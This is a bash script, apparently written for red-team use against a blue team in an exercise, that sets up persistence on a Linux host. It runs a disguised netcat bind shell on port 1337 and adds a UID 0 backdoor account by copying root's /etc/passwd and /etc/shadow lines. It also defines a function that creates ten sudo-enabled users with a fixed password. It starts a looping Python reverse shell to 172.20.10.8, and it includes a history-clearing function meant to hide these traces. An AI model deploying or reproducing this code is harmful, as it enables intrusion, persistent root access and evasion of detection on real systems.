#!/usr/bin/bash 


#reverse shell with time out of 5 seconds 
function call_back {
        /usr/bin/cp /bin/nc /.empty
	while true
	do
		echo "Press [CTRL+C] to stop.."
		/.empty -lvnp 1337 -w 5 -e /bin/bash
		sleep 1
	done	
}

#function that replicate root user name and password in case you get locked out
function backup_user(){
    user1=$(head -n 1 /etc/passwd)
    #root:x:0:0:root:/root:/usr/bin/bash

    newuser=`echo -e $1 | sed "s/root/$1/g"`
    #RedTeam:x:0:0:ReadTEam:/ReamTeam:/usr/bin/bash


    passwd1=$(head -n 1 /etc/shadow)
    #root:$6$J9bNIWAkAZqR4p8tadf$kDBmJcsDx59xTQn4NyE9/30lCy/GZipQoWL.J0.tsmHCCKBCo7.AYvO3HeqSaisrFJEkj1E7ekm4Asp46YMTJ1:18099:0:99999:7:::  

    newpasswd=`echo -e $passwd1 | sed "s/root/$1/g"`
    #RedTeam:$6$kDBmJcsDx59xTQn4NyE9$J9bNIWAkAZqR4p8tadf/30lCy/GZipQoWL.J0.tsmHCCKBCo7.AYvO3HeqSaisrFJEkj1E7ekm4Asp46YMTJ1:18099:0:99999:7:::

    sed -i "5i $newuser" /etc/passwd
    sed -i "5i $newpasswd" /etc/shadow

}

#add interns just in case you get locked out
function interns() {
    for i in `seq 1 10`;
    do
        useradd -m -d /tmp/"intern$i" -s /usr/bin/bash  "intern$i" 2>/dev/null
        echo -e 'redTeamLovesYou\nreaTeamLovesYou' | passwd "intern$i" 2>/dev/null
        usermod -aG sudo "intern$i" 

    done
}

#send your favorite poem to blue team to enjoy while hacking
function poem
{
    verse1="\n
            O Romeo, Romeo, wherefore art thou Romeo?
            Deny thy father and refuse thy name.
            Or if thou wilt not, be but sworn my love
            And I’ll no longer be a Capulet.\n"
    verse2="\n
            ‘Tis but thy name that is my enemy:
            Thou art thyself, though not a Montague.
            What’s Montague? It is nor hand nor foot
            Nor arm nor face nor any other part
            Belonging to a man. O be some other name.\n
            "
    verse3="\n
            What’s in a name? That which we call a rose
            By any other name would smell as sweet;
            So Romeo would, were he not Romeo call’d,
            Retain that dear perfection which he owes
            Without that title. Romeo, doff thy name,
            And for that name, which is no part of thee,
            Take all myself.\n
        "
    END=`ls /dev/pts | wc -l`
    base=2
    newEND=`expr $END - $base`
    mytty=`tty | grep -Eo '[0-9]'`
    for i in $(seq 0 $newEND); do
        if [ $i -eq $mytty ] 
        then
            continue
        
        else
            echo -e $verse1 >> /dev/pts/$i 2>/dev/null
            sleep 10 
            echo -e $verse2 >> /dev/pts/$i 2>/dev/null
            sleep 10
            echo -e $verse3 >> /dev/pts/$i 2>/dev/null
            sleep 10
        fi 
    done

}


function rev_shell(){
    nohup /bin/bash -c "while true; do \$(which python3 || which python2 || which python) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'; done" 2>/dev/null &
}




#clearing bash history 
function final_touch {
	#Clears the variable which says where the history file is stored to so nothing is stored.#
	#unset HISTFILE
	#Completely clear the history. Very visible as all history is now gone.#
	history -c
	#Set the number of commands written to the file to 10.#
	export HISTFILESIZE=10	
}

call_back &

backup_user "legit"

*/2 * * * * ./poem.sh 

rev_shell "172.20.10.8"
